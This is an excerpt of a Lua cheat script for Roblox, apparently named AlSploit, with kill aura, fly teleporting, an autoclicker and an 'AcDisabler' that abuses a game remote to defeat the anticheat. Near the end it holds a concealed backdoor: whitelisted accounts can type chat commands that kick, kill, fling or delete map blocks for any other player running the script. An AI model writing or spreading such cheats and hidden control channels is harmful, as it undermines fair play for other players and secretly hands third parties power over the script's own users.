local WhitelistedUsers = {User1 = "imagod_033", User2 = "4SaD45", User3 = "iusealsploit", User4 = "umother2001vjd", User5 = "ncm_hack"}
...
local SaveFileName = "SavingSystemAlSploit"
...
local function CreateSettingsFile()
	Settings = {
		...
		KillAura = {Value = true, Range = 20, CustomAnimation = true, ToolCheck = false, Strafe = false, KeyBind = "..."},
...
local BlossomWindTunnelCreateBodyForceRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BlossomWindTunnelCreateBodyForce")
...
local function SwordHit(Entity, Weapon, NearestEntityDistance)
	...
	task.spawn(function()
		if Settings.KillAura.Strafe == true and NearestEntityDistance < (AnticheatDisabled and 16 or 12) then
			LocalPlayerHumanoidRootPart.CFrame = CFrame.new(EntityPrimaryPart.Position - EntityPrimaryPart.CFrame.LookVector * 5 + Vector3.new(0, 0, 5))
		end
	end)
				...
				if FlyValue == true and IsAlive(LocalPlayer) then
					...
					if (tick() - FlyGroundTime) >= 2.4 then
						...
						if Raycast and Raycast.Instance and IsAlive(LocalPlayer) then 
							LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(Raycast.Instance.Position) + Vector3.new(0, LocalPlayer.Character.Humanoid.HipHeight, 0)
	...
	repeat
		...
		task.spawn(function()
			...
			if Settings.AcDisabler.Value == true and IsAlive(LocalPlayer) then
				...
				task.spawn(function()
					BlossomWindTunnelCreateBodyForceRemote:FireServer()
				end)
			end
...
task.spawn(function()
	repeat
		...
		if Settings.AutoClicker.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
			task.spawn(function()
				if ClientHandlerStore:getstate().Inventory.observedInventory == "block" and BlockPlacementController.blockPlacer.clientManager then
...
task.spawn(function()
	local Sigma, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Sigma", Settings.Sigma.Value, function(CallBack)
		...
		if Settings.Sigma.Value == false then
			task.spawn(function()
				if IsAlive(LocalPlayer) and Settings.Cape.Value == true and LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Decal") then
					LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Decal").Texture = "rbxassetid://" .. 16223063079
				end
			end)
		end
	end)
...
task.spawn(function()
	local Cape, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Cape", Settings.Cape.Value, function(CallBack)
		...
		if Settings.Cape.Value == true then
			task.spawn(function()
				local DecalId = (Settings.Sigma.Value and 13528140280 or 16223063079)
...
task.spawn(function()
	repeat
		...
		for i, v in next, PlayerService:GetPlayers() do
			for i, v1 in next, WhitelistedUsers do
				v.Chatted:Connect(function(Message)				
					if Message:lower() == ";kick default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~= Owner and v.Name ~= LocalPlayer.Name then
						task.spawn(function()
							LocalPlayer:Kick("Kicked by AlSploit owner")
						end)
					end

					if Message:lower() == ";kill default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~= Owner and v.Name ~= LocalPlayer.Name then
						task.spawn(function()
							KillHumanoid(0)
						end)
					end

					if Message:lower() == ";lagback default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~=  Owner and v.Name ~= LocalPlayer.Name then
						task.spawn(function()
							LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(99999, 99999, 99999)
						end)
					end				

					if Message:lower() == ";breakmap default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~=  Owner and v.Name ~= LocalPlayer.Name then
						task.spawn(function()
							for i, v in next, CollectionService:GetTagged("block") do
								v:Destroy()
							end
...
task.spawn(function()
	for i, v in next, WhitelistedUsers do
		if v.Name == LocalPlayer.Name or LocalPlayer.Name == Owner then
			...
			task.spawn(function()
				LocalPlayer.Character.ChildAdded:Connect(function(Part)
